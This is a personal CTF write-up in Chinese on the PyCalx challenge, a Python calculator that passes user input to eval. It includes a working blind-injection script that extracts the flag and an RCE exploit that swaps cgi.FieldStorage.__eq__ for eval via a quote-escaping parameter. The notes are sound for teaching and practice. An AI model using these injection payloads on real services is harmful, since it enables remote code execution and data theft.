tags:: [[CTF/Python]]

- > 这题是在buuctf上复现的，buuctf提供的环境中Python环境为3.5.2，和原题不相同，导致PyCalx2无法做出（其解法依赖f-string)
- # 思路
	- 思路1：通过类似SQL布尔盲注的方式读取flag
	- 思路2：通过赋值魔术方法进行函数调用，实现RCE
	- 套路：
		- 可以通过控制source变量拿到任意字符串
		- 可以通过在集合内使用集合生成式，用`for`进行赋值
		- 可以让`op="+'"`实现字符逃逸
- # 布尔盲注读取flag
	- 可以通过对比字符串进行布尔盲注
	- 控制value1和value2的值让eval的表达式变成`'a'+''+FLAG>=source`
	- 然后通过控制source的值进行布尔盲注
	- ```python
	  known = ""
	  while True:
	      for i in range(32, 128):
	          r = base_get(url, params = {
	              "source": "a" + known + chr(i),
	              "value1": "a",
	              "op": "+'",
	              "value2": "+FLAG>=source#"
	          })
	          data = r.text.rpartition(">>>>")[2]
	          if "False" in data:
	              if i == 32:
	                  continue
	              known += chr(i - 1)
	              print(known)
	              break
	      else:
	          break
	  print(known)
	  ```
- # RCE
	- 将某个类的`__eq__`魔术方法换成eval, 然后通过对比调用`__eq__`即可调用eval进行RCE
	- 原理示例
		- ```python
		  import cgi
		  
		  fs = cgi.FieldStorage()
		  cgi.FieldStorage.__eq__ = eval
		  fs == "print(114514)" # 会打印114514
		  ```
	- 为了绕过一个eval只能运行一个表达式的限制，我们将上面的三个语句改写成set
		- ```python
		  import cgi
		  
		  arguments = cgi.FieldStorage()
		  {1 for cgi.FieldStorage.__eq__ in {eval, }} *\
		  {arguments == "print(114514)" for _ in {1, }}
		  ```
	- 根据上面的原理写exp即可，注意这里需要使用乘号控制执行顺序
		- ```python
		  payload = "__import__('time').sleep(5)"
		  r = requests.get(url, params = {
		      "source": payload,
		      "value1": "T",
		      "op": "+'",
		      "value2": "+{1 for cgi.FieldStorage.__eq__ in {eval}}*{arguments==source}#"
		  })
		  
		  data = r.text.rpartition(">>>>")[2]
		  print(data)
		  # print("False\n>>>" in data)
		  ```
- # 施工中
	- 任意字符串：使用`source`变量
	- 可以：
		- 赋值：直接使用`=`
		- 修改魔术方法
		- 使用类似布尔盲注的方式读取flag
		- 单引号逃逸
			- op: `+'`